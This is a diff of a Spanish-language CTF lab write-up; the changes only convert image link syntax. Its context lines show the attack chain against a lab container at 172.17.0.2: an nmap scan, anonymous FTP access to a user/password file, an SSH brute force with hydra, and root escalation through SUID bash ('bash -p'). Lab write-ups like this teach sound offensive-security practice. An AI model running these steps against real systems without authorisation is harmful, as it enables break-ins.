@@ -22,7 +22,7 @@ nmap -p- -sS --min-rate 5000 -n -vvv -Pn -sC -sV -oN ports 172.17.0.2
 
 **Resultados:**
 
-![](images/IMG-20260626155832396.png)
+![[IMG-20260626155832396.png]]
 
 
 **Análisis:**
@@ -50,7 +50,7 @@ ftp 172.17.0.2
     
 - Contraseña: (vacía) 
 
-![](images/IMG-20260626155832462.png)
+![[IMG-20260626155832462.png]]
 
 
 **Explorando el FTP:**
@@ -59,14 +59,14 @@ ftp 172.17.0.2
 ftp> ls
 ```
 
-![](images/IMG-20260626155832520.png)
+![[IMG-20260626155832520.png]]
 
 ```bash
 ftp> cd pub
 ftp> ls
 ```
 
-![](images/IMG-20260626155832587.png)
+![[IMG-20260626155832587.png]]
 
 
 **Hallazgo crítico:** Encontramos un archivo `usuarios.txt` en el directorio `pub`.
@@ -78,12 +78,12 @@ ftp> get usuarios.txt
 ftp> exit
 ```
 
-![](images/IMG-20260626155832649.png)
+![[IMG-20260626155832649.png]]
 
 ---
 
 
-![](images/IMG-20260626155832711.png)
+![[IMG-20260626155832711.png]]
 
 **Observaciones:**
 
@@ -104,7 +104,7 @@ ftp> exit
 cat usuarios.txt
 ```
 
-![](images/IMG-20260626155832778.png)
+![[IMG-20260626155832778.png]]
 
 **Observaciones:**
 
@@ -132,13 +132,13 @@ cut -d: -f2 usuarios.txt > passwd.txt
 cat users.txt
 ```
 
-![](images/IMG-20260626155832855.png)
+![[IMG-20260626155832855.png]]
 
 ```bash
 cat passwd.txt
 ```
 
-![](images/IMG-20260626155832931.png)
+![[IMG-20260626155832931.png]]
 
 ### Ataque con Hydra (SSH)
 
@@ -150,7 +150,7 @@ hydra -L users.txt -P passwd.txt ssh://172.17.0.2 -t 4 -f
 
 **Resultado esperado:**
 
-![](images/IMG-20260626155832993.png)
+![[IMG-20260626155832993.png]]
 
 ### Conexión SSH
 
@@ -180,7 +180,7 @@ ssh alberto@172.17.0.2
 
 **Conexión exitosa:**
 
-![](images/IMG-20260626155833055.png)
+![[IMG-20260626155833055.png]]
 
 ---
 
@@ -194,7 +194,7 @@ ssh alberto@172.17.0.2
 bash-5.2$ whoami
 ```
 
-![](images/IMG-20260626155833116.png)
+![[IMG-20260626155833116.png]]
 
 **2. Verificar permisos `sudo`:**
 
@@ -202,7 +202,7 @@ bash-5.2$ whoami
 bash-5.2$ sudo -l
 ```
 
-![](images/IMG-20260626155833174.png)
+![[IMG-20260626155833174.png]]
 
 **Conclusión:** El usuario `alberto` no tiene permisos `sudo`.
 
@@ -212,7 +212,7 @@ bash-5.2$ sudo -l
 bash-5.2$ find / -perm -4000 2>/dev/null
 ```
 
-![](images/IMG-20260626155833210.png)
+![[IMG-20260626155833210.png]]
 
 **Hallazgo crítico:** `/usr/bin/bash` tiene el bit SUID activado.
 
@@ -222,20 +222,20 @@ bash-5.2$ find / -perm -4000 2>/dev/null
 bash-5.2$ /usr/bin/bash -p
 ```
 
-![](images/IMG-20260626155833282.png)
+![[IMG-20260626155833282.png]]
 
 ```
 bash-5.2# whoami
 ```
 
-![](images/IMG-20260626155833339.png)
+![[IMG-20260626155833339.png]]
 ### Captura de la Flag
 
 ```bash
 bash-5.2# cd /root
 ```
 
-![](images/IMG-20260626155833375.png)
+![[IMG-20260626155833375.png]]
 
 ---
 
